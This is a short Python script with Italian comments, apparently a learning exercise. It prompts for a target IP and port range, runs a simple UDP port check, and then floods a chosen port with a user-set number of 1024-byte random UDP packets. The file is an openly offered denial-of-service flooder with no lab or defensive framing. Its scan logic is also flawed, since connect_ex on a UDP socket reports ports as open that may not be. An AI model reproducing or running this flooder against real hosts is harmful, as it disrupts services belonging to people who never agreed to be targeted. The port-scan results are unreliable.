

import socket           
import random

def udp_flood(target, port, numero_pacchetti):         #DEFINISCO LA FUNZIONE UDP_FLOOD PER L'INVIO DI PACCHETTI UDP ALL'INDIRIZZO IP E PORTA DEL SISTEMA TARGET
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)     #CREO IL SOCKET DI RETE CON IPV4 E PROTOCOLLO UDP
    bytes = random._urandom(1024)                            #GENERO UNA SEQUENZA DI BYTES CASUALI   

    for _ in range(numero_pacchetti):                 #CICLO FOR NEL RANGE STABILITO DAL NUMERO DI PACCHETI CHE VOGLIO INVIARE
        s.sendto(bytes, (target, port))               #LA FUNZIONE .SENDTO INVIA I BYTES GENERATI AL SISTEMA TARGET
        print(f"Pacchetto inviato all'indirizzo {target} e porta {port}")   #STAMPO LA STRINGA CHE MI CONFERMA L'INVIO DEL PACCHETTO


target = input("Inserire IP:\n")                     #INSERISCO L'INDIRIZZO IP TARGET
portrange = input("Inserire range di porte: \n")     #INSERISCO ANCHE UN RANGE DI PORTE DA SCANSIONARE
porta_target = int(input("Inserire la porta:\n"))    #INSERISCO LA PORTA TARGET DOVE INVIARE I PACCHETTI 
numero_pacchetti = int(input("Inserire il numero di pacchetti da inviare:\n"))     #QUANTI PACCHETTI VOGLIO INVIARE?


lowport = int(portrange.split('-')[0])              #NUMERO MINIMO DEL RANGE PORTE
highport = int(portrange.split('-')[1])             #NUMERO MASSIMO DEL RANGE PORTE

print(f"Scansiono l'indirizzo {target} dalla porta {lowport} alla {highport}\n")    #ESEGUO LA SCANSIONE


open_ports = []                                            #LISTA DELLE PORTE APERTE                             
for port in range(lowport, highport + 1):                  #CICLO FOR PER TROVARE LA PORTA IN UN RANGE TRA lowport E highport+1
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   #CREO IL SOCKET
    status = s.connect_ex((target, port))                  #CONNETTO IL SOCKET ALL'IP E ALLA PORTA
    if status == 0:                                        #SE STATUS == 0 LA PORTA E' APERTA, ALTRIMENTI E' CHIUSA.
        print(f"Porta {port} - APERTA")        
        open_ports.append(port)                            #MOSTRAMI LE PORTE APERTE ALLA FINE DELLA LISTA
    else:
        print(f"Porta {port} - CHIUSA")
    s.close()                                              #CHIUDO IL SOCKET DI RETE

print(f"Le porte aperte sono:\n{open_ports}")


udp_flood(target, porta_target, numero_pacchetti)       


